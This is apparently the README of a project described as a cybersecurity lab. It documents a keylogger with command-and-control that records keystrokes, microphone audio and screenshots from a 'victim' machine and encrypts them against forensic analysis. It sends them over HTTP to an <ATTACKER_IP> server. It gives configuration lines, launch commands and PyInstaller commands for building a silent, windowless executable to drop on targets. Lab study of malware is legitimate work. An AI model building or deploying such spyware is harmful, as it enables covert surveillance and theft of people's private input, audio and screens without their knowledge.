# 🚀 Advanced C2 Keylogger (Cybersecurity Lab)

This project simulates an **Advanced Command & Control (C&C) Keylogger** system, developed as a cybersecurity laboratory exercise. Its purpose is to collect various events (**keystrokes, audio, screenshots**) from a victim machine, implement **robust data resilience**, **encrypt the data** using Fernet, and establish a **bidirectional C2 channel** for remote management. All collected logs are exfiltrated via HTTP to an attacker's server, and visualized in real-time using a Streamlit dashboard.

---

## 🏗️ Project Architecture and Structure

The system is implemented across three logical components and relies on a **bidirectional communication flow**: the Victim polls the Attacker for commands, and the Attacker's Controller posts commands to the Attacker's Flask server.


### 1. 🖥️ Target (Victim) (Folder `victime/`)

| File | Role | Key Features |
| :--- | :--- | :--- |
| **`keylogger.py`** | The core malware logic. | **Multithreaded** capture, Fernet encryption, resilience handling, and **C2 Command Polling** (`command_routine`). |
| **`config.py`** | **CRITICAL:** Centralized configuration file. | Defines `SERVER_URL` and the new **`C2_COMMAND_URL`**. Must be edited with the Attacker's IP. |
| `buffer.jsonl` | Resilience file (created at runtime). | Stores logs if exfiltration fails (Ignored by Git). |

### 2. 🗄️ Attacker (C2 Server Receiver & Command Store) (Folder `attaquant/`)

| File/Folder | Role | Key Features |
| :--- | :--- | :--- |
| **`server.py`** | The **Flask server** C2. | **Dual Endpoints**: Receives logs (`/log`) and manages the command queue (`/command`) for the victims. |
| `stockage/` | **Storage Folder** (created at runtime). | Stores final events in individual victim folders as `events.jsonl` (JSON Lines format). |

### 3. 📊 Controller (C2 Dashboard & Command Emitter) (Folder `controller/`)

| File | Role | Key Features |
| :--- | :--- | :--- |
| **`dashboard.py`** | The **Streamlit Dashboard** (the C2 interface). | Visualization, text reconstruction, media playback, and interface for **posting remote commands** to the C2 server. |

### 4. 📄 Root Configuration

| File | Rôle |
| :--- | :--- |
| `requirements.txt` | **Single file** listing all necessary Python dependencies (including `mss`, `pyaudio`, `cryptography`, `streamlit`, `requests`). |
| **`.gitignore`** | Excludes logs, buffers, virtual environments (`venv`), and PyInstaller output (`dist/`). |

---

## ⚙️ Compilation, Installation, and Launch

### ⚠️ Prerequisites

* **Python 3.x** installed.
* **Network Setup**: Ensure the Attacker and Victim VMs are on the **same private network** (e.g., VirtualBox Internal Network) with **static IP addresses**.
* **PyAudio Dependencies**: Before `pip install`, you might need to install system libraries (e.g., `portaudio` on Linux/macOS).

### Step 1: Initial Setup and C2 Configuration

1.  **Update C2 IP Address (Victim Side):**
    Edit the file **`victime/config.py`** and replace the default IP with the **actual IP address** of your attacker VM for both log exfiltration and command polling:
    * `SERVER_URL = "http://<ATTACKER_IP>:5000/log"`
    * `C2_COMMAND_URL = "http://<ATTACKER_IP>:5000/command"`

2.  **Install Dependencies:**
    Install all dependencies using the root `requirements.txt` file in the respective virtual environments.

    ```bash
    # Create and activate environment
    python3 -m venv venv_project
    source venv_project/bin/activate

    # Install all dependencies
    pip install -r requirements.txt
    ```

3.  **Launch the C2 Server and Controller:**
    These must be launched on the **Attacker VM** in separate terminals.

    ```bash
    # Terminal 1: Launch the Flask Server (Log Receiver & Command Store)
    cd attaquant/
    python server.py
    
    # Terminal 2: Launch the Streamlit Dashboard (Controller Interface)
    cd controller/
    streamlit run controller.py
    ```

### Step 2: Launching the Keylogger (Victim)

Execute the Python script on the target machine:

```bash
cd victime/
python keylogger.py
```

-----

## ✨ Implemented Features (Advanced C2)

### 1\. Robust Data Collection

| Feature | Detail | Implementation |
| :--- | :--- | :--- |
| **Multithreaded Capture** | Asynchronously captures multiple event types without blocking. | Separate threads for Keyboard, Audio, Screenshots, and C2 Polling. |
| **Keystrokes** | Records all pressed keys. | `pynput` listener. |
| **Screenshots** | Periodic capture (default **15s**) of the primary screen. | `mss` and `Pillow` for efficient PNG compression and Base64 encoding. |
| **Audio Clips** | Periodic recording (default **5s**) from the microphone. | `pyaudio` for raw PCM 16-bit data, wrapped in Base64. |

### 2\. Security and Resilience

  * **Local Encryption (Fernet)**: All captured data is immediately encrypted using a **Fernet** key before being written to local storage, making direct forensic analysis difficult.
  * **Data Resilience**: Uses a persistent local file (`buffer.jsonl`). If exfiltration fails (e.g., C2 server down), data is saved locally and **automatically resent** in the next successful communication cycle.

### 3\. Bidirectional Command & Control (C2)

The system supports C2 commands posted from the Controller and retrieved by the Victim's **Command Poller** thread via HTTP GET requests.

| Command via Controller | Victim Action |
| :--- | :--- |
| **▶️ Start/Stop Capture** | Remotely sets the global `is_capturing` state to suspend or resume all collection threads. |
| **🔄 Switch Mode** | Changes the communication protocol state (`comm_mode`) for future exfiltration (e.g., switching from HTTP to a placeholder TCP mode). |
| **🧹 Flush Logs Now** | Forces the Victim to immediately send all buffered data, ignoring the set exfiltration interval. |

### 4\. C2 Dashboard Analytics (`controller.py`)

  * **Reconstructed Text**: Rebuilds the typed text from raw keystrokes, correctly handling `backspace` and `enter` events.
  * **Media Visualization**: Decodes Base64 images for direct display and constructs **WAV headers** around raw audio data for immediate playback using `st.audio`.
  * **Keystroke Analysis**: Provides visual analytics on **Activity Timelines** and **Key Frequency** to identify active periods and common inputs.
  * **Data Export**: Allows downloading the complete, processed logs in **CSV format** for external forensic analysis.

-----

## 📦 Creating a Standalone Executable (`.exe` or `.pkg`)

To run the keylogger without requiring a Python environment on the victim machine, use **PyInstaller**.

### Installation

Install PyInstaller in the victim's environment:

```bash
pip install pyinstaller
```

### Compilation

Navigate to the **`victime/`** folder and execute the appropriate command based on the target OS:

| Target OS | Command | Output |
| :--- | :--- | :--- |
| **Windows (`.exe`)** | `pyinstaller --onefile --windowed --add-data "config.py;." keylogger.py` | `dist/keylogger.exe` |
| **Linux (`.elf`)** | `pyinstaller --onefile --add-data "config.py:." keylogger.py` | `dist/keylogger` |

**Command Breakdown:**

  * **`--onefile`**: Packages everything into a single executable file.
  * **`--windowed` (Windows only)**: Prevents the console window from opening, running the application silently in the background.
  * **`--add-data`**: **Crucial step\!** Embeds the `config.py` file into the executable so the C2 IP is known at runtime.

The final executable file will be located in the **`dist`** folder (e.g., `victime/dist/keylogger.exe`).